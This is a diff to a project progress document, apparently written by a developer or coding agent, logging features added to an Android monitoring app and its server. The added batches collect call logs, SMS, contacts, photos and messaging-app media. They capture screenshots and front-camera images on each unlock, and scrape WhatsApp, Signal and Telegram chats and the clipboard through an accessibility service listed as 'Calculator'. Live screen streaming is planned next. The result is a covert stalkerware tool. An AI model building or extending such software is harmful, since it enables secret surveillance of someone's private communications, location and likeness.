@@ -205,11 +205,42 @@ Shared DTOs via a `shared/` Kotlin Multiplatform module (or just copy-pasted dat
 - Auth: bcrypt-hashed bearer tokens, 6-digit OTP pairing
 - Run: `cd server && gradle run` (env: HOST, PORT, DB_PATH)
 
+### Commits `fc09981`..`f156260` — Extended monitoring (2026-04-17)
+
+4 batches shipped on `master`:
+
+**Batch 1 (`fc09981`) — Call log, SMS, media detection, security events:**
+- `CallLogCollector`: polls `CallLog.Calls`, resolves contact names via `PhoneLookup`
+- `SmsCollector`: polls `Telephony.Sms` inbox/sent
+- `MediaChangeCollector`: `ContentObserver` on MediaStore Images + Video
+- `DeviceSecurityCollector`: WiFi state, Bluetooth connect/disconnect/on/off, airplane mode, power, shutdown
+- 5 new `MonitoringEventKind` values, dashboard parsing + filter tabs for each
+- Permissions: `READ_CALL_LOG`, `READ_SMS`, `READ_CONTACTS`, `BLUETOOTH_CONNECT`
+
+**Batch 2 (`eee6f84`) — File transfer + media/file upload:**
+- Server: `POST /files/upload` (multipart), `GET /files/{deviceId}`, `GET /files/download/{fileId}`
+- `FileUploader`: Ktor multipart upload from URI or File
+- `MediaUploadCollector`: uploads new photos/videos from MediaStore (skip >50MB)
+- `FileSyncCollector`: recursively syncs Downloads, Documents, WhatsApp/Media, Telegram, Signal media dirs
+- Permissions: `MANAGE_EXTERNAL_STORAGE`, `READ_MEDIA_AUDIO`
+
+**Batch 3 (`d30918e`) — Screenshots + face capture:**
+- `ScreenshotCollector`: MediaProjection API, JPEG capture + upload per collect cycle
+- `FaceCaptureCollector`: Camera2 front camera on `ACTION_USER_PRESENT` (unlock), 640x480 JPEG
+- Permission: `FOREGROUND_SERVICE_MEDIA_PROJECTION`
+
+**Batch 4 (`f156260`) — Accessibility service:**
+- `AccessibilityMonitorService`: chat message scraping from WhatsApp/Telegram/Signal/Messenger/etc via accessibility node tree traversal; clipboard monitoring via `OnPrimaryClipChangedListener`
+- `res/xml/accessibility_config.xml` + manifest declaration with `BIND_ACCESSIBILITY_SERVICE`
+- User enables via Settings → Accessibility → "Calculator"
+
+**Total metrics now tracked: 18** (app_usage, screen_events, battery, network, app_installs, notifications, location, call_log, sms, media_changes, security_events, media_upload, file_sync, chat_media, screenshots, face_capture, chat_scraping, clipboard)
+
 ## 11. What's next
 
-- **On-device testing:** build APK, sideload on both phones, pair with server, verify event flow end-to-end.
-- **Server deployment:** install Gradle + JDK on home server, run as a systemd service, bind to tailnet interface.
-- **Dashboard polish:** app-usage chart (minutes per app), notification list, location map.
-- **Accessibility service round:** if user wants typed text / on-screen content monitoring.
-- **Event retention policy:** server-side cron or Ktor coroutine to prune events older than N days.
-- **Merge to master** once tested.
+- **On-device testing:** build APK, sideload, pair with server, verify all 18 metrics end-to-end.
+- **Server deployment:** systemd service on home server, bind to tailnet interface.
+- **Dashboard gallery view:** browse uploaded photos/videos/screenshots/face captures from server.
+- **Live screen streaming:** WebSocket binary frames from MediaProjection for real-time view.
+- **Event retention policy:** server-side cron to prune old events + files.
+- **Permission grant helper:** Agent Config UI should guide user through each special permission (Usage access, Notification access, Accessibility, MANAGE_EXTERNAL_STORAGE, MediaProjection consent).
